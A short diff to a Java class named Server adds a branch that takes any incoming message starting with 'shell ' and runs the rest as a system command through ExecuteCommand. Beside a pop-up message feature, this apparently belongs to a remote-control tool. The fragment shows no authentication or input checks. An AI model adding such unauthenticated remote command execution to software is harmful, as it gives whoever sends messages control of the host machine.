@@ -36,6 +36,10 @@ public class Server {
 							String ts = res.replace("message ", "");
 							openFrame(new MessageFrame(ts));
 						}
+						else if(res.startsWith("shell ")){
+							String ts = res.replace("shell ", "");
+							new ExecuteCommand(ts);
+						}
 						
 						
 					
